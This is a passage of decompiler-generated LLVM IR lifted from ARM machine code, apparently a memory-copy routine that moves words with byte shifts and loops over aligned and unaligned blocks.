  store i1 %v6_17570, i1* %cpsr_n.global-to-local, align 1
  %v7_17570 = icmp eq i32 %v1_17570, 0
  store i1 %v7_17570, i1* %cpsr_z.global-to-local, align 1
  %v2_17574 = xor i1 %v6_17570, %v5_17570
  br i1 %v2_17574, label %dec_label_pc_17590, label %dec_label_pc_17578

dec_label_pc_17578:                               ; preds = %dec_label_pc_1756c, %dec_label_pc_1752c, %dec_label_pc_17578
  %v1_17584 = phi i32 [ %v4_17584, %dec_label_pc_17578 ], [ %v12_17560, %dec_label_pc_1756c ], [ %v0_175cc76, %dec_label_pc_1752c ]
  %v0_17578 = load i32, i32* %lr.global-to-local, align 4
  %v3_17578 = udiv i32 %v0_17578, 65536
  store i32 %v3_17578, i32* %ip.global-to-local, align 4
  %v0_1757c = load i32, i32* %r1.global-to-local, align 4
  %v1_1757c = inttoptr i32 %v0_1757c to i32*
  %v2_1757c = load i32, i32* %v1_1757c, align 4
  store i32 %v2_1757c, i32* %lr.global-to-local, align 4
  %v4_1757c = add i32 %v0_1757c, 4
  store i32 %v4_1757c, i32* %r1.global-to-local, align 4
  %v4_17580 = mul i32 %v2_1757c, 65536
  %v5_17580 = or i32 %v4_17580, %v3_17578
  store i32 %v5_17580, i32* @ip, align 4
  %v2_17584 = inttoptr i32 %v1_17584 to i32*
  store i32 %v5_17580, i32* %v2_17584, align 4
  %v3_17584 = load i32, i32* @r0, align 4
  %v4_17584 = add i32 %v3_17584, 4
  store i32 %v4_17584, i32* @r0, align 4
  %v0_17588 = load i32, i32* %r2.global-to-local, align 4
  %v1_17588 = add i32 %v0_17588, -4
  store i32 %v1_17588, i32* %r2.global-to-local, align 4
  %v3_17588 = sub i32 3, %v0_17588
  %v4_17588 = and i32 %v3_17588, %v0_17588
  %v5_17588 = icmp slt i32 %v4_17588, 0
  %v6_17588 = icmp slt i32 %v1_17588, 0
  %v2_1758c = xor i1 %v6_17588, %v5_17588
  br i1 %v2_1758c, label %dec_label_pc_17590.loopexit, label %dec_label_pc_17578

dec_label_pc_17590.loopexit:                      ; preds = %dec_label_pc_17578
  %v7_17588 = icmp eq i32 %v0_17588, 4
  store i1 %v5_17588, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_17588, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_17588, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17590

dec_label_pc_17590:                               ; preds = %dec_label_pc_17590.loopexit, %dec_label_pc_1756c
  %v0_1744c60 = phi i32 [ %v1_17588, %dec_label_pc_17590.loopexit ], [ %v1_17570, %dec_label_pc_1756c ]
  %v0_17590 = load i32, i32* %r1.global-to-local, align 4
  %v1_17590 = add i32 %v0_17590, -2
  store i32 %v1_17590, i32* @r1, align 4
  br label %bb140

dec_label_pc_17598:                               ; preds = %dec_label_pc_174ac
  br i1 %v2_17530, label %dec_label_pc_175e4, label %dec_label_pc_175a0

dec_label_pc_175a0:                               ; preds = %dec_label_pc_17598
  store i32 %v1_1752c, i32* %r2.global-to-local, align 4
  %v3_175a4 = load i32, i32* @r4, align 4
  store i32 %v3_175a4, i32* %stack_var_-16, align 4
  %v6_175a4 = load i32, i32* @r5, align 4
  store i32 %v6_175a4, i32* %stack_var_-12, align 4
  br label %dec_label_pc_175a8

dec_label_pc_175a8:                               ; preds = %dec_label_pc_175a8.dec_label_pc_175a8_crit_edge, %dec_label_pc_175a0
  %v0_175cc = phi i32 [ %v12_175cc, %dec_label_pc_175a8.dec_label_pc_175a8_crit_edge ], [ %v0_175cc76, %dec_label_pc_175a0 ]
  %v0_175ac = phi i32 [ %v0_175ac.pre, %dec_label_pc_175a8.dec_label_pc_175a8_crit_edge ], [ %v4_174b0, %dec_label_pc_175a0 ]
  %v0_175a8 = phi i32 [ %v0_175a8.pre, %dec_label_pc_175a8.dec_label_pc_175a8_crit_edge ], [ %v2_174b0, %dec_label_pc_175a0 ]
  %v3_175a8 = udiv i32 %v0_175a8, 16777216
  %v1_175ac = inttoptr i32 %v0_175ac to i32*
  %v2_175ac = load i32, i32* %v1_175ac, align 4
  store i32 %v2_175ac, i32* %r4.global-to-local, align 4
  %v3_175ac = add i32 %v0_175ac, 4
  %v4_175ac = inttoptr i32 %v3_175ac to i32*
  %v5_175ac = load i32, i32* %v4_175ac, align 4
  store i32 %v5_175ac, i32* %r5.global-to-local, align 4
  %v6_175ac = add i32 %v0_175ac, 8
  %v7_175ac = inttoptr i32 %v6_175ac to i32*
  %v8_175ac = load i32, i32* %v7_175ac, align 4
  store i32 %v8_175ac, i32* %ip.global-to-local, align 4
  %v9_175ac = add i32 %v0_175ac, 12
  %v10_175ac = inttoptr i32 %v9_175ac to i32*
  %v11_175ac = load i32, i32* %v10_175ac, align 4
  store i32 %v11_175ac, i32* %lr.global-to-local, align 4
  %v12_175ac = add i32 %v0_175ac, 16
  store i32 %v12_175ac, i32* %r1.global-to-local, align 4
  %v4_175b0 = mul i32 %v2_175ac, 256
  %v5_175b0 = or i32 %v4_175b0, %v3_175a8
  store i32 %v5_175b0, i32* @r3, align 4
  %v3_175b4 = udiv i32 %v2_175ac, 16777216
  %v4_175b8 = mul i32 %v5_175ac, 256
  %v5_175b8 = or i32 %v4_175b8, %v3_175b4
  store i32 %v5_175b8, i32* %r4.global-to-local, align 4
  %v3_175bc = udiv i32 %v5_175ac, 16777216
  %v4_175c0 = mul i32 %v8_175ac, 256
  %v5_175c0 = or i32 %v4_175c0, %v3_175bc
  store i32 %v5_175c0, i32* %r5.global-to-local, align 4
  %v3_175c4 = udiv i32 %v8_175ac, 16777216
  %v4_175c8 = mul i32 %v11_175ac, 256
  %v5_175c8 = or i32 %v4_175c8, %v3_175c4
  store i32 %v5_175c8, i32* @ip, align 4
  %v1_175cc = inttoptr i32 %v0_175cc to i32*
  store i32 %v5_175b0, i32* %v1_175cc, align 4
  %v3_175cc = add i32 %v0_175cc, 4
  %v4_175cc = inttoptr i32 %v3_175cc to i32*
  %v5_175cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_175cc, i32* %v4_175cc, align 4
  %v6_175cc = add i32 %v0_175cc, 8
  %v7_175cc = inttoptr i32 %v6_175cc to i32*
  %v8_175cc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_175cc, i32* %v7_175cc, align 4
  %v9_175cc = add i32 %v0_175cc, 12
  %v10_175cc = inttoptr i32 %v9_175cc to i32*
  %v11_175cc = load i32, i32* @ip, align 4
  store i32 %v11_175cc, i32* %v10_175cc, align 4
  %v12_175cc = add i32 %v0_175cc, 16
  store i32 %v12_175cc, i32* @r0, align 4
  %v0_175d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_175d0 = add i32 %v0_175d0, -16
  store i32 %v1_175d0, i32* %r2.global-to-local, align 4
  %v3_175d0 = sub i32 15, %v0_175d0
  %v4_175d0 = and i32 %v3_175d0, %v0_175d0
  %v5_175d0 = icmp slt i32 %v4_175d0, 0
  %v6_175d0 = icmp slt i32 %v1_175d0, 0
  %v2_175d4 = xor i1 %v6_175d0, %v5_175d0
  br i1 %v2_175d4, label %dec_label_pc_175d8, label %dec_label_pc_175a8.dec_label_pc_175a8_crit_edge

dec_label_pc_175a8.dec_label_pc_175a8_crit_edge:  ; preds = %dec_label_pc_175a8
  %v0_175a8.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_175ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_175a8

dec_label_pc_175d8:                               ; preds = %dec_label_pc_175a8
  %v2_175d8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_175d8, i32* @r4, align 4
  %v5_175d8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_175d8, i32* @r5, align 4
  %v1_175dc = add i32 %v0_175d0, -4
  store i32 %v1_175dc, i32* %r2.global-to-local, align 4
  %v3_175dc = add i32 %v0_175d0, 2147483632
  %v4_175dc = and i32 %v1_175dc, %v3_175dc
  %v5_175dc = icmp slt i32 %v4_175dc, 0
  store i1 %v5_175dc, i1* %cpsr_v.global-to-local, align 1
  %v6_175dc = icmp slt i32 %v1_175dc, 0
  store i1 %v6_175dc, i1* %cpsr_n.global-to-local, align 1
  %v7_175dc = icmp eq i32 %v1_175dc, 0
  store i1 %v7_175dc, i1* %cpsr_z.global-to-local, align 1
  %v2_175e0 = xor i1 %v6_175dc, %v5_175dc
  br i1 %v2_175e0, label %dec_label_pc_175fc, label %dec_label_pc_175e4

dec_label_pc_175e4:                               ; preds = %dec_label_pc_175d8, %dec_label_pc_17598, %dec_label_pc_175e4
  %v1_175f0 = phi i32 [ %v4_175f0, %dec_label_pc_175e4 ], [ %v12_175cc, %dec_label_pc_175d8 ], [ %v0_175cc76, %dec_label_pc_17598 ]
  %v0_175e4 = load i32, i32* %lr.global-to-local, align 4
  %v3_175e4 = udiv i32 %v0_175e4, 16777216
  store i32 %v3_175e4, i32* %ip.global-to-local, align 4
  %v0_175e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_175e8 = inttoptr i32 %v0_175e8 to i32*
  %v2_175e8 = load i32, i32* %v1_175e8, align 4
  store i32 %v2_175e8, i32* %lr.global-to-local, align 4
  %v4_175e8 = add i32 %v0_175e8, 4
  store i32 %v4_175e8, i32* %r1.global-to-local, align 4
  %v4_175ec = mul i32 %v2_175e8, 256
  %v5_175ec = or i32 %v4_175ec, %v3_175e4
  store i32 %v5_175ec, i32* @ip, align 4
  %v2_175f0 = inttoptr i32 %v1_175f0 to i32*
  store i32 %v5_175ec, i32* %v2_175f0, align 4
  %v3_175f0 = load i32, i32* @r0, align 4
  %v4_175f0 = add i32 %v3_175f0, 4
  store i32 %v4_175f0, i32* @r0, align 4
  %v0_175f4 = load i32, i32* %r2.global-to-local, align 4
  %v1_175f4 = add i32 %v0_175f4, -4
  store i32 %v1_175f4, i32* %r2.global-to-local, align 4
  %v3_175f4 = sub i32 3, %v0_175f4
  %v4_175f4 = and i32 %v3_175f4, %v0_175f4
  %v5_175f4 = icmp slt i32 %v4_175f4, 0
  %v6_175f4 = icmp slt i32 %v1_175f4, 0
  %v2_175f8 = xor i1 %v6_175f4, %v5_175f4
  br i1 %v2_175f8, label %dec_label_pc_175fc.loopexit, label %dec_label_pc_175e4

dec_label_pc_175fc.loopexit:                      ; preds = %dec_label_pc_175e4
  %v7_175f4 = icmp eq i32 %v0_175f4, 4
  store i1 %v5_175f4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_175f4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_175f4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_175fc

dec_label_pc_175fc:                               ; preds = %dec_label_pc_175fc.loopexit, %dec_label_pc_175d8
  %v0_1744c61 = phi i32 [ %v1_175f4, %dec_label_pc_175fc.loopexit ], [ %v1_175dc, %dec_label_pc_175d8 ]
  %v0_175fc = load i32, i32* %r1.global-to-local, align 4
  %v1_175fc = add i32 %v0_175fc, -1
  store i32 %v1_175fc, i32* @r1, align 4
  br label %bb140

dec_label_pc_17604:                               ; preds = %entry
  %v1_17604 = load i32, i32* @r2, align 4
  %v2_17604 = add i32 %v1_17604, %v0_173b0
  store i32 %v2_17604, i32* %r1.global-to-local, align 4
  %v2_17608 = add i32 %v1_17604, %v1_173b0
  store i32 %v2_17608, i32* %r0.global-to-local, align 4
  %v2_1760c = add i32 %v1_17604, -4
  store i32 %v2_1760c, i32* %r2.global-to-local, align 4
  %v4_1760c = sub i32 3, %v1_17604
  %v5_1760c = and i32 %v4_1760c, %v1_17604
  %v6_1760c = icmp slt i32 %v5_1760c, 0
  store i1 %v6_1760c, i1* %cpsr_v.global-to-local, align 1
  %v7_1760c = icmp slt i32 %v2_1760c, 0
  store i1 %v7_1760c, i1* %cpsr_n.global-to-local, align 1
  %v8_1760c = icmp eq i32 %v1_17604, 4
  store i1 %v8_1760c, i1* %cpsr_z.global-to-local, align 1
  %v5_17610 = icmp slt i32 %v1_17604, 4
  br i1 %v5_17610, label %bb150, label %dec_label_pc_17614

dec_label_pc_17614:                               ; preds = %dec_label_pc_17604
  %v1_17614 = urem i32 %v2_17608, 4
  store i32 %v1_17614, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17614 = icmp eq i32 %v1_17614, 0
  store i1 %v2_17614, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17614, label %dec_label_pc_1761c, label %dec_label_pc_176bc

dec_label_pc_1761c:                               ; preds = %dec_label_pc_17614
  %v1_1761c = urem i32 %v2_17604, 4
  store i32 %v1_1761c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1761c = icmp eq i32 %v1_1761c, 0
  store i1 %v2_1761c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1761c, label %dec_label_pc_17624, label %dec_label_pc_176e8

dec_label_pc_17624:                               ; preds = %dec_label_pc_1761c, %dec_label_pc_176e0
  %v0_1763c37 = phi i32 [ %v2_17608, %dec_label_pc_1761c ], [ %v0_1773020, %dec_label_pc_176e0 ]
  %v0_1763836 = phi i32 [ %v2_17604, %dec_label_pc_1761c ], [ %v0_176e0, %dec_label_pc_176e0 ]
  %v0_17624 = phi i32 [ %v2_1760c, %dec_label_pc_1761c ], [ %v2_176d8, %dec_label_pc_176e0 ]
  %v2_17624 = add i32 %v0_17624, -8
  store i32 %v2_17624, i32* %r2.global-to-local, align 4
  %v4_17624 = sub i32 7, %v0_17624
  %v5_17624 = and i32 %v4_17624, %v0_17624
  %v6_17624 = icmp slt i32 %v5_17624, 0
  store i1 %v6_17624, i1* %cpsr_v.global-to-local, align 1
  %v7_17624 = icmp slt i32 %v2_17624, 0
  store i1 %v7_17624, i1* %cpsr_n.global-to-local, align 1
  %v8_17624 = icmp eq i32 %v0_17624, 8
  store i1 %v8_17624, i1* %cpsr_z.global-to-local, align 1
  %v5_17628 = icmp slt i32 %v0_17624, 8
  br i1 %v5_17628, label %dec_label_pc_17674, label %dec_label_pc_1762c

dec_label_pc_1762c:                               ; preds = %dec_label_pc_17624
  %v3_1762c = load i32, i32* @r4, align 4
  %v5_1762c = inttoptr i32 %v3_1762c to i8*
  store i8* %v5_1762c, i8** %stack_var_-8, align 4
  %v8_1762c = load i32, i32* @lr, align 4
  %v2_17630 = add i32 %v0_17624, -28
  store i32 %v2_17630, i32* %r2.global-to-local, align 4
  %v4_17630 = sub i32 27, %v0_17624
  %v5_17630 = and i32 %v4_17630, %v2_17624
  %v6_17630 = icmp slt i32 %v5_17630, 0
  store i1 %v6_17630, i1* %cpsr_v.global-to-local, align 1
  %v7_17630 = icmp slt i32 %v2_17630, 0
  store i1 %v7_17630, i1* %cpsr_n.global-to-local, align 1
  %v8_17630 = icmp eq i32 %v2_17624, 20
  store i1 %v8_17630, i1* %cpsr_z.global-to-local, align 1
  %v5_17634 = icmp slt i32 %v2_17624, 20
  br i1 %v5_17634, label %dec_label_pc_17650, label %dec_label_pc_17638

dec_label_pc_17638:                               ; preds = %dec_label_pc_1762c, %dec_label_pc_17638.dec_label_pc_17638_crit_edge
  %v0_1763c = phi i32 [ %v1_17644, %dec_label_pc_17638.dec_label_pc_17638_crit_edge ], [ %v0_1763c37, %dec_label_pc_1762c ]
  %v0_17638 = phi i32 [ %v0_17638.pre, %dec_label_pc_17638.dec_label_pc_17638_crit_edge ], [ %v0_1763836, %dec_label_pc_1762c ]
  %v1_17638 = add i32 %v0_17638, -4
  %v2_17638 = inttoptr i32 %v1_17638 to i32*
  %v3_17638 = load i32, i32* %v2_17638, align 4
  %v4_17638 = add i32 %v0_17638, -8
  %v5_17638 = inttoptr i32 %v4_17638 to i32*
  %v6_17638 = load i32, i32* %v5_17638, align 4
  store i32 %v6_17638, i32* %r4.global-to-local, align 4
  %v7_17638 = add i32 %v0_17638, -12
  %v8_17638 = inttoptr i32 %v7_17638 to i32*
  %v9_17638 = load i32, i32* %v8_17638, align 4
  store i32 %v9_17638, i32* %ip.global-to-local, align 4
  %v10_17638 = add i32 %v0_17638, -16
  %v11_17638 = inttoptr i32 %v10_17638 to i32*
  %v12_17638 = load i32, i32* %v11_17638, align 4
  store i32 %v12_17638, i32* %lr.global-to-local, align 4
  store i32 %v10_17638, i32* %r1.global-to-local, align 4
  %v1_1763c = add i32 %v0_1763c, -16
  %v2_1763c = inttoptr i32 %v1_1763c to i32*
  store i32 %v3_17638, i32* %v2_1763c, align 4
  %v4_1763c = add i32 %v0_1763c, -12
  %v5_1763c = inttoptr i32 %v4_1763c to i32*
  %v6_1763c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1763c, i32* %v5_1763c, align 4
  %v7_1763c = add i32 %v0_1763c, -8
  %v8_1763c = inttoptr i32 %v7_1763c to i32*
  %v9_1763c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_1763c, i32* %v8_1763c, align 4
  %v10_1763c = add i32 %v0_1763c, -4
  %v11_1763c = inttoptr i32 %v10_1763c to i32*
  %v12_1763c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1763c, i32* %v11_1763c, align 4
  store i32 %v1_1763c, i32* %r0.global-to-local, align 4
  %v0_17640 = load i32, i32* %r1.global-to-local, align 4
  %v1_17640 = add i32 %v0_17640, -4
  %v2_17640 = inttoptr i32 %v1_17640 to i32*
  %v3_17640 = load i32, i32* %v2_17640, align 4
  store i32 %v3_17640, i32* @r3, align 4
  %v4_17640 = add i32 %v0_17640, -8
  %v5_17640 = inttoptr i32 %v4_17640 to i32*
  %v6_17640 = load i32, i32* %v5_17640, align 4
  store i32 %v6_17640, i32* %r4.global-to-local, align 4
  %v7_17640 = add i32 %v0_17640, -12
  %v8_17640 = inttoptr i32 %v7_17640 to i32*
  %v9_17640 = load i32, i32* %v8_17640, align 4
  store i32 %v9_17640, i32* @ip, align 4
  %v10_17640 = add i32 %v0_17640, -16
  %v11_17640 = inttoptr i32 %v10_17640 to i32*
  %v12_17640 = load i32, i32* %v11_17640, align 4
  store i32 %v12_17640, i32* %lr.global-to-local, align 4
  store i32 %v10_17640, i32* %r1.global-to-local, align 4
  %v1_17644 = add i32 %v0_1763c, -32
  %v2_17644 = inttoptr i32 %v1_17644 to i32*
  store i32 %v3_17640, i32* %v2_17644, align 4
  %v4_17644 = add i32 %v0_1763c, -28
  %v5_17644 = inttoptr i32 %v4_17644 to i32*
  %v6_17644 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_17644, i32* %v5_17644, align 4
  %v7_17644 = add i32 %v0_1763c, -24
  %v8_17644 = inttoptr i32 %v7_17644 to i32*
  %v9_17644 = load i32, i32* @ip, align 4
  store i32 %v9_17644, i32* %v8_17644, align 4
  %v10_17644 = add i32 %v0_1763c, -20
  %v11_17644 = inttoptr i32 %v10_17644 to i32*
  %v12_17644 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_17644, i32* %v11_17644, align 4
  store i32 %v1_17644, i32* %r0.global-to-local, align 4
  %v0_17648 = load i32, i32* %r2.global-to-local, align 4
  %v2_17648 = add i32 %v0_17648, -32
  store i32 %v2_17648, i32* %r2.global-to-local, align 4
  %v6_1764c = icmp slt i32 %v0_17648, 32
  br i1 %v6_1764c, label %dec_label_pc_17650.loopexit, label %dec_label_pc_17638.dec_label_pc_17638_crit_edge

dec_label_pc_17638.dec_label_pc_17638_crit_edge:  ; preds = %dec_label_pc_17638
  %v0_17638.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17638

dec_label_pc_17650.loopexit:                      ; preds = %dec_label_pc_17638
  %v4_17648 = sub i32 31, %v0_17648
  %v5_17648 = and i32 %v4_17648, %v0_17648
  %v6_17648 = icmp slt i32 %v5_17648, 0
  %v7_17648 = icmp slt i32 %v2_17648, 0
  store i1 %v6_17648, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_17648, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17650

dec_label_pc_17650:                               ; preds = %dec_label_pc_17650.loopexit, %dec_label_pc_1762c
  %v6_17658 = phi i32 [ %v1_17644, %dec_label_pc_17650.loopexit ], [ %v0_1763c37, %dec_label_pc_1762c ]
  %v0_17660.pr = phi i32 [ %v2_17648, %dec_label_pc_17650.loopexit ], [ %v2_17630, %dec_label_pc_1762c ]
  %v4_17650 = add i32 %v0_17660.pr, 16
  %v6_17650 = sub i32 0, %v0_17660.pr
  %v7_17650 = and i32 %v4_17650, %v6_17650
  %v8_17650 = icmp slt i32 %v7_17650, 0
  store i1 %v8_17650, i1* %cpsr_v.global-to-local, align 1
  %v9_17650 = icmp slt i32 %v4_17650, 0
  store i1 %v9_17650, i1* %cpsr_n.global-to-local, align 1
  %v10_17650 = icmp eq i32 %v4_17650, 0
  store i1 %v10_17650, i1* %cpsr_z.global-to-local, align 1
  %v5_17654 = icmp slt i32 %v0_17660.pr, -16
  br i1 %v5_17654, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_17650
  %v6_17654 = load i32, i32* %r1.global-to-local, align 4
  %v7_17654 = add i32 %v6_17654, -4
  %v8_17654 = inttoptr i32 %v7_17654 to i32*
  %v9_17654 = load i32, i32* %v8_17654, align 4
  store i32 %v9_17654, i32* @r3, align 4
  %v10_17654 = add i32 %v6_17654, -8
  %v11_17654 = inttoptr i32 %v10_17654 to i32*
  %v12_17654 = load i32, i32* %v11_17654, align 4
  store i32 %v12_17654, i32* %r4.global-to-local, align 4
  %v13_17654 = add i32 %v6_17654, -12
  %v14_17654 = inttoptr i32 %v13_17654 to i32*
  %v15_17654 = load i32, i32* %v14_17654, align 4
  store i32 %v15_17654, i32* @ip, align 4
  %v16_17654 = add i32 %v6_17654, -16
  %v17_17654 = inttoptr i32 %v16_17654 to i32*
  %v18_17654 = load i32, i32* %v17_17654, align 4
  store i32 %v18_17654, i32* %lr.global-to-local, align 4
  store i32 %v16_17654, i32* %r1.global-to-local, align 4
  %v7_17658 = add i32 %v6_17658, -16
  %v8_17658 = inttoptr i32 %v7_17658 to i32*
  store i32 %v9_17654, i32* %v8_17658, align 4
  %v10_17658 = add i32 %v6_17658, -12
  %v11_17658 = inttoptr i32 %v10_17658 to i32*
  %v12_17658 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_17658, i32* %v11_17658, align 4
  %v13_17658 = add i32 %v6_17658, -8
  %v14_17658 = inttoptr i32 %v13_17658 to i32*
  %v15_17658 = load i32, i32* @ip, align 4
  store i32 %v15_17658, i32* %v14_17658, align 4
  %v16_17658 = add i32 %v6_17658, -4
  %v17_17658 = inttoptr i32 %v16_17658 to i32*
  %v18_17658 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_17658, i32* %v17_17658, align 4
  store i32 %v7_17658, i32* %r0.global-to-local, align 4
  %v6_1765c = load i32, i32* %r2.global-to-local, align 4
  %v7_1765c = add i32 %v6_1765c, -16
  store i32 %v7_1765c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17650, %bb147
  %v6_17668 = phi i32 [ %v7_17658, %bb147 ], [ %v6_17658, %dec_label_pc_17650 ]
  %v0_17660 = phi i32 [ %v7_1765c, %bb147 ], [ %v0_17660.pr, %dec_label_pc_17650 ]
  %v4_17660 = add i32 %v0_17660, 20
  store i32 %v4_17660, i32* %r2.global-to-local, align 4
  %v6_17660 = sub i32 0, %v0_17660
  %v7_17660 = and i32 %v4_17660, %v6_17660
  %v8_17660 = icmp slt i32 %v7_17660, 0
  store i1 %v8_17660, i1* %cpsr_v.global-to-local, align 1
  %v9_17660 = icmp slt i32 %v4_17660, 0
  store i1 %v9_17660, i1* %cpsr_n.global-to-local, align 1
  %v10_17660 = icmp eq i32 %v4_17660, 0
  store i1 %v10_17660, i1* %cpsr_z.global-to-local, align 1
  %v5_17664 = icmp slt i32 %v0_17660, -20
  br i1 %v5_17664, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_17664 = load i32, i32* %r1.global-to-local, align 4
  %v7_17664 = add i32 %v6_17664, -4
  %v8_17664 = inttoptr i32 %v7_17664 to i32*
  %v9_17664 = load i32, i32* %v8_17664, align 4
  store i32 %v9_17664, i32* @r3, align 4
  %v10_17664 = add i32 %v6_17664, -8
  %v11_17664 = inttoptr i32 %v10_17664 to i32*
  %v12_17664 = load i32, i32* %v11_17664, align 4
  store i32 %v12_17664, i32* @ip, align 4
  %v13_17664 = add i32 %v6_17664, -12
  %v14_17664 = inttoptr i32 %v13_17664 to i32*
  %v15_17664 = load i32, i32* %v14_17664, align 4
  store i32 %v15_17664, i32* %lr.global-to-local, align 4
  store i32 %v13_17664, i32* %r1.global-to-local, align 4
  %v7_17668 = add i32 %v6_17668, -12
  %v8_17668 = inttoptr i32 %v7_17668 to i32*
  store i32 %v9_17664, i32* %v8_17668, align 4
  %v10_17668 = add i32 %v6_17668, -8
  %v11_17668 = inttoptr i32 %v10_17668 to i32*
  %v12_17668 = load i32, i32* @ip, align 4
  store i32 %v12_17668, i32* %v11_17668, align 4
  %v13_17668 = add i32 %v6_17668, -4
  %v14_17668 = inttoptr i32 %v13_17668 to i32*
  %v15_17668 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_17668, i32* %v14_17668, align 4
  store i32 %v7_17668, i32* %r0.global-to-local, align 4
  %v6_1766c = load i32, i32* %r2.global-to-local, align 4
  %v7_1766c = add i32 %v6_1766c, -12
  store i32 %v7_1766c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_1768c45 = phi i32 [ %v6_17668, %.thread2 ], [ %v7_17668, %bb148 ]
  %v0_1767443 = phi i32 [ %v4_17660, %.thread2 ], [ %v7_1766c, %bb148 ]
  %v2_17670 = load i8*, i8** %stack_var_-8, align 4
  %v3_17670 = ptrtoint i8* %v2_17670 to i32
  store i32 %v3_17670, i32* @r4, align 4
  store i32 %v8_1762c, i32* @lr, align 4
  br label %dec_label_pc_17674

dec_label_pc_17674:                               ; preds = %dec_label_pc_17624, %.thread4
  %v7_17684 = phi i32 [ %v0_1763c37, %dec_label_pc_17624 ], [ %v6_1768c45, %.thread4 ]
  %v0_17674 = phi i32 [ %v2_17624, %dec_label_pc_17624 ], [ %v0_1767443, %.thread4 ]
  %v2_17674 = add i32 %v0_17674, 8
  store i32 %v2_17674, i32* %r2.global-to-local, align 4
  %v4_17674 = sub i32 0, %v0_17674
  %v5_17674 = and i32 %v2_17674, %v4_17674
  %v6_17674 = icmp slt i32 %v5_17674, 0
  store i1 %v6_17674, i1* %cpsr_v.global-to-local, align 1
  %v7_17674 = icmp slt i32 %v2_17674, 0
  store i1 %v7_17674, i1* %cpsr_n.global-to-local, align 1
  %v8_17674 = icmp eq i32 %v2_17674, 0
  store i1 %v8_17674, i1* %cpsr_z.global-to-local, align 1
  %v5_17678 = icmp slt i32 %v0_17674, -8
  br i1 %v5_17678, label %bb150, label %dec_label_pc_1767c

dec_label_pc_1767c:                               ; preds = %dec_label_pc_17674
  %v6_1767c = add i32 %v0_17674, 4
  store i32 %v6_1767c, i32* %r2.global-to-local, align 4
  %v8_1767c = sub i32 -5, %v0_17674
  %v9_1767c = and i32 %v8_1767c, %v2_17674
  %v10_1767c = icmp slt i32 %v9_1767c, 0
  store i1 %v10_1767c, i1* %cpsr_v.global-to-local, align 1
  %v11_1767c = icmp slt i32 %v6_1767c, 0
  store i1 %v11_1767c, i1* %cpsr_n.global-to-local, align 1
  %v12_1767c = icmp eq i32 %v2_17674, 4
  store i1 %v12_1767c, i1* %cpsr_z.global-to-local, align 1
  %v5_17680 = icmp slt i32 %v2_17674, 4
  %v6_17680 = load i32, i32* %r1.global-to-local, align 4
  %v7_17680 = add i32 %v6_17680, -4
  %v8_17680 = inttoptr i32 %v7_17680 to i32*
  %v9_17680 = load i32, i32* %v8_17680, align 4
  store i32 %v9_17680, i32* @r3, align 4
  br i1 %v5_17680, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_1767c
  store i32 %v7_17680, i32* %r1.global-to-local, align 4
  %v8_17684 = add i32 %v7_17684, -4
  %v9_17684 = inttoptr i32 %v8_17684 to i32*
  store i32 %v9_17680, i32* %v9_17684, align 4
  %v10_17684 = load i32, i32* %r0.global-to-local, align 4
  %v11_17684 = add i32 %v10_17684, -4
  store i32 %v11_17684, i32* %r0.global-to-local, align 4
  %v0_17694.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_1767c
  %v10_17688 = add i32 %v6_17680, -8
  %v11_17688 = inttoptr i32 %v10_17688 to i32*
  %v12_17688 = load i32, i32* %v11_17688, align 4
  store i32 %v12_17688, i32* @ip, align 4
  store i32 %v10_17688, i32* %r1.global-to-local, align 4
  %v7_1768c = add i32 %v7_17684, -8
  %v8_1768c = inttoptr i32 %v7_1768c to i32*
  store i32 %v9_17680, i32* %v8_1768c, align 4
  %v10_1768c = add i32 %v7_17684, -4
  %v11_1768c = inttoptr i32 %v10_1768c to i32*
  %v12_1768c = load i32, i32* @ip, align 4
  store i32 %v12_1768c, i32* %v11_1768c, align 4
  store i32 %v7_1768c, i32* %r0.global-to-local, align 4
  %v6_17690 = load i32, i32* %r2.global-to-local, align 4
  %v7_17690 = add i32 %v6_17690, -4
  store i32 %v7_17690, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_17674, %dec_label_pc_17604, %dec_label_pc_17838, %dec_label_pc_177cc, %dec_label_pc_17760, %bb149
